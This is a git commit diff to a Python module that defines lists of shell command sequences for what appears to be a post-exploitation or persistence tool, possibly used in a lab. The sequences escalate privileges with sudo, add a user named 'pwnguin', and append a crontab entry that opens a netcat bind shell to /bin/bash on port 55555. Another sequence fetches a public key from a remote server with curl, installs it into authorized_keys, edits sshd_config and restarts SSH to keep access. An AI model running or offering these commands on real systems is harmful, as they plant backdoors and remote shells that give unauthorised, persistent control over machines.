3a6d0f1a754e80f03c22d2502fec42ce8beb381b
Kilian S <kiliansoual@outlook.fr>
2024-02-21 14:09:25 +0100

    modif sequences

--- modules/sequences.py
+++ modules/sequences.py
@@ -4,23 +4,6 @@ SEQUENCE_0 = ["whoami",
               "sudo -i",
               "whoami"]
 
-<<<<<<< Updated upstream
-SEQUENCE_1 = []
-
-SEQUENCE_3 = [
-        "whoami",
-        "curl -s " + srv + "/post/id_rsa.pub -o id_rsa.pub > /dev/null",
-        "mkdir ~/.ssh",
-        "touch ~/.ssh/authorized_keys",
-        "chmod 700 ~/.ssh",
-        "cat id_rsa.pub > ~/.ssh/authorized_keys",
-        "chmod 600 ~/.ssh/authorized_keys",
-        "rm id_rsa.pub",
-        "echo 'PubkeyAuthentication yes' | cat - /etc/ssh/sshd_config > temp && mv temp /etc/ssh/sshd_config",
-        "/etc/init.d/ssh restart",
-        "echo get persisted kid",
-    ]
-=======
 SEQUENCE_1 = ["whoami",
               "sudo -l",
               "sudo useradd pwnguin",
@@ -33,4 +16,15 @@ SEQUENCE_2 = ["whoami",
               "cat /etc/crontab",
               "sudo echo '10 14 * * *   vagrant     nc -l -p 55555 -e /bin/bash' >> /etc/crontab",
               "cat /etc/crontab"]
->>>>>>> Stashed changes
+
+SEQUENCE_3 = ["whoami",
+              "curl -s " + srv + "/post/id_rsa.pub -o id_rsa.pub > /dev/null",
+              "mkdir ~/.ssh",
+              "touch ~/.ssh/authorized_keys",
+              "chmod 700 ~/.ssh",
+              "cat id_rsa.pub > ~/.ssh/authorized_keys",
+              "chmod 600 ~/.ssh/authorized_keys",
+              "rm id_rsa.pub",
+              "echo 'PubkeyAuthentication yes' | cat - /etc/ssh/sshd_config > temp && mv temp /etc/ssh/sshd_config",
+              "/etc/init.d/ssh restart",
+              "echo get persisted kid"]
